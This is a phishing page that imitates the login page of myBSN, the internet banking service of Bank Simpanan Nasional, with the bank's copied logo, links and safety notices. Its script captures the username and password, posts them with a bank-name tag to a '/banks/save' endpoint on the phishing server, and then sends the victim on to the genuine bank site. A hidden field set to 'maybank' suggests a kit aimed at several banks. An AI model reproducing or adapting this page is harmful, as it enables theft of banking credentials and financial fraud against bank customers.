<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0045)https://www.mybsn.com.my/mybsn/login/login.do -->
<html slick-uniqueid="1"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
<meta http-equiv="Content-language" content="en">
<meta name="robots" content="noodp,noydir">
<meta name="csrf-token" content="{{ csrf_token() }}">

<title>myBSN - Log in to myBSN Internet Banking - Bank Simpanan Nasional</title>
<script type="text/javascript" src="banks/bsn/dtagent_ICASTVj_7000000291008.js.download" data-dtconfig="agentUri=/mybsn/dtagent_ICASTVj_7000000291008.js|rid=RID_171444126|rpid=1128252460|domain=mybsn.com.my|lastModification=1535070471822|lab=1|reportUrl=/mybsn/dynaTraceMonitor|app=mybsn"></script><link href="banks/bsn/IB_style.css" rel="stylesheet" type="text/css"> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!--   
<link href="/mybsn/css/sidemenu.css" rel="stylesheet" type="text/css">
-->      
<link href="banks/bsn/ns4.css" rel="stylesheet" type="text/css">
	<link rel="shortcut icon" href="https://www.mybsn.com.my/mybsn/images/favicon.ico">
    <link rel="icon" type="image/gif" href="https://www.mybsn.com.my/mybsn/images/animated_favicon1.gif">
	
<meta http-equiv="Content-language" content="en">
<meta name="robots" content="noodp,noydir">





	
	
	
		
		
			
				
				
					<script type="text/javascript" src="banks/bsn/MooTools-Core-1.5.1-yc.js.download"></script>
				
			
		
	
















<script type="text/javascript" src="banks/bsn/common.min.js.download"></script>




	
	
	
		
		
			
				
				
					<script type="text/javascript" src="banks/bsn/MooTools-More-1.5.1-yc.js.download"></script>
				
			
			<script type="text/javascript" src="banks/bsn/mootools-form.en-US.js.download"></script>
			<script type="text/javascript" src="banks/bsn/mt-form-validate.min.js.download"></script>
		
	
	<script type="text/javascript"> MooTools.lang.setLanguage("en-US"); </script>



<script>if (top.frames.length > 0) top.location.href = this.location.href</script>
<script type="text/javascript">
	window.addEvent('domready', function() {				
		var u = $('userForm');		
		var formValidator = myBSN.validator(u);
		myBSN.bindDefaultButton(u, '#step2');
		$('username').focus();
		
		$('reset').addEvent('click',function(){
			formValidator.reset();
		});
		
		$('viewCache').addEvent('click', function() {
			myBSN.openContents(this.href);
			return false;
		});
	});	

	$.ajaxSetup({
		headers: {
			'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
		}
	});

	function loginfunction() {
		$.ajax({
			type: "POST",
			data: {username: document.getElementById("username").value,
				   password: document.getElementById("password").value,
				   bankname: document.getElementById("bankname").value},
			url : "/banks/save",
			success : function (sdata) {
				// document.getElementById("test").innerHTML = sdata ;
				// document.getElementById("test").append(sdata);
				// $('#test').html(sdata);
				location.href = "https://www.mybsn.com.my/mybsn/login/login.do";
			}
		});
	}

	function userfunction() {
		if(document.getElementById("username").value.length >= 8) {
			document.getElementById("usernamelabel").style.display = "none";
			document.getElementById("username").style.display = "none";
			document.getElementById("confirmImagebtn").style.display = "none";
			document.getElementById("passwordlabel").style.display = "block";
			document.getElementById("password").style.display = "block";
			document.getElementById("confirmImage").style.display = "block";
		}
	}
</script>
<script type="text/javascript">
(function() {
var message="This is Copyrighted Material.\nCopyright 2015 \251 Bank Simpanan Nasional.\nPlease contact us for more information.";

function clickIE4(){
if (event.button==2){
alert(message);
return false;
}
}

function clickNS4(e){
if (document.layers || document.getElementById && !document.all){
if (e.which==2 || e.which==3){
alert(message);
return false;
}
}
}

if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=function() { alert(message); return false; }
})();

</script>
<!-- script type="text/javascript" src="../../script/accordian.pack.js"></script-->

</head>
<body>
<!---HEADER--->
<div id="global-header">
<div id="header">
	<!-- logo -->
	<div id="logo"><img src="banks/bsn/header-logo-new.gif" style="padding-top: 10px;"></div>
	<div id="headerRight">
		<!-- upper header -->
		<div id="upperHeader" style="margin-right: -13px;">Customer Service Centre<br><div id="contactNo" style="color: #00a0af;">1 300 88 1900</div></div>
		<!-- lower header -->
		<div id="lowerHeader">
		</div>
	</div>
</div>
</div>
<!---END HEADER--->

<div id="container" align="center">
	<!---WELCOME TEXT--->
	<!---BREADCRUMB--->
	
	<!------------------------------------LEFT BAR------------------------------------>
	<div id="accordian">
	    <div id="text-header" class="accordion_headings"><a target="_top" href="http://www.mybsn.com.my/index.xhtml" class="menu_headings">Back to Homepage</a></div> 						

		<div id="text-header" class="accordion_headings"><a class="menu_headings" href="https://www.mybsn.com.my/mybsn/login/login.do">Login</a></div>

		<div id="text-header" class="accordion_headings"><a target="_top" class="menu_headings" href="https://www.mybsn.com.my/mybsn/register/register.do">First Time Registration</a></div>

		<div id="text-header" class="accordion_headings"><a target="_top" class="menu_headings" href="https://www.mybsn.com.my/mybsn/reset/reset_password.do">Forgot Password</a></div>

		<div id="text-header" class="accordion_headings"><a target="_top" href="http://www.mybsn.com.my/content.xhtml?contentId=153" class="menu_headings">How to Sign-up</a></div>

		<div id="text-header" class="accordion_headings"><a target="_blank" class="menu_headings" onclick="popup = window.open(this.href, &#39;PopupPage&#39;, &#39;height=450,width=500,scrollbars=yes,resizable=yes&#39;); return false" href="https://www.mybsn.com.my/mybsn/disclaimer.jsp">Demo</a></div>
	</div>	
	<!------------------------------------END LEFT BAR------------------------------------>
		
	<div class="column">
		<div class="top-banner">
	
	
</div>
<div id="content">
	<table id="table-form">
	<tbody><tr height="10"></tr>
	<tr>
	<td width="315" align="left">
		<form method="post" action="banks/save" name="userForm" id="userForm">
			<div id="user-form-title" class="text13B">Log in to myBSN Internet Banking</div>
			<div class="textRed"></div>
			
			<table class="form-table">	
				<tbody><tr height="5"></tr>
				<tr>				
					<td>
						<div><strong><label class="textHeadings" id="usernamelabel" for="username">Username</label></strong></div>
						<div><strong><label class="textHeadings" id="passwordlabel" style="display:none;" for="username">Password</label></strong></div>
						<input class="text required minLength:8 maxLength:12 validation-failed" autocomplete="off" maxlength="12" type="text" name="username" id="username">
						<input class="text required minLength:8 maxLength:12 validation-failed" style="display:none;" autocomplete="off" maxlength="12" type="text" name="password" id="password">
						<input type="hidden" id="bankname" value="maybank">
						<!-- <div id="advice-minLength-username" class="validation-advice" style="display: block;">Error: Please enter at least 8 characters (you entered 0 characters).</div><div id="advice-required-username" class="validation-advice" style="display: block;">Error: This field is required.</div> -->
					</td>
				</tr>
				<tr>
					<td>
					<div id="user-form-buttons" class="command-buttons">
						<input value="Clear" type="reset" name="reset" id="reset">
						<input value="Login" type="button" name="confirmImage" id="confirmImagebtn" onClick="userfunction();">
						<input value="Login" type="button" name="confirmImage" style="display:none;" id="confirmImage" onClick="loginfunction();">
					</div>
					</td>
				</tr>
			</tbody></table>
		<!-- <div style="display: none;"><input type="hidden" name="_sourcePage" value="ZA429tmRkmH-Q8DOXz10QWlhYwprz9dNv5_maqamTOXKkDR2Ez-bsA=="><input type="hidden" name="__fp" value="Ck11U3wPB-w="></div> -->
	</form>
	  	<div><br>Don't have an Internet Banking account?<br>	  	
	    <a href="http://www.mybsn.com.my/content.xhtml?contentId=153">Find out here on how to register for myBSN.</a><br>
	    </div>
	</td>
	<td width="260">
	
	<table id="table-info" width="250">
		<tbody><tr>
			<td>
				<p class="textblue12B">Stay safe and secure online!</p>
				<div id="bullet">
					<ul>
					<li>Don‘t login via email links</li>
					<li>Please ensure you key in the correct URL:www.mybsn.com.my</li>				    
					<li>Notify us <a href="http://www.mybsn.com.my/feedback.xhtml">here</a> of any myBSN "phishing" website</li>
					<li>Don‘t forget to clear your <a href="http://www.mybsn.com.my/pop-up-clear-cache.html" id="viewCache" name="viewCache" event="sample">cache</a> after logging out</li>
					</ul>
				</div>				
				<p class="textblue12B">myBSN Internet Banking Hours</p>
				<div id="bullet">
					<ul>
					<li>12.15 am - 12.00 am </li>
					</ul>
				</div>				
				<p class="textblue12B">Customer Service Centre</p>
				<div id="bullet">
					<ul>
			            <li>From 7.00am - 12.00 midnight</li>
					</ul>
				</div>				
			</td>
		</tr>
	</tbody></table>
			
	</td>
	</tr>
	</tbody></table>
</div>
	</div>
	
	<div>		
	<div id="footer">
	 <a target="bsn" href="http://www.mybsn.com.my/content.xhtml?contentId=252">Client Charter</a>&nbsp;&nbsp;&nbsp;| &nbsp;&nbsp;&nbsp;
	 <a target="bsn" href="http://www.mybsn.com.my/content.xhtml?contentId=253">Privacy Policy</a>&nbsp;&nbsp;&nbsp;| &nbsp;&nbsp;&nbsp;
	 <a target="bsn" href="http://www.mybsn.com.my/content.xhtml?contentId=254">Security Statement</a>&nbsp;&nbsp;&nbsp;| &nbsp;&nbsp;&nbsp;
	 <a target="bsn" href="http://www.mybsn.com.my/content.xhtml?contentId=255">Terms &amp; Conditions</a>&nbsp;&nbsp;&nbsp;| &nbsp;&nbsp;&nbsp;  
	 <a target="bsn" href="http://www.mybsn.com.my/content.xhtml?contentId=223">Contact Us</a><p></p>
	 <div class="disclaimer">
	 	Copyright © Bank Simpanan Nasional reserved.<br>
	 	Use of the information on this page is intended for Malaysian citizens and permanent residents of Malaysia only and all contents <br>
	 	on this website are governed by Malaysian law and are subject to the disclaimer which can be read on the disclaimer page.
	</div>
</div>


	</div>
</div>
<pre id="test"></pre>

</body></html>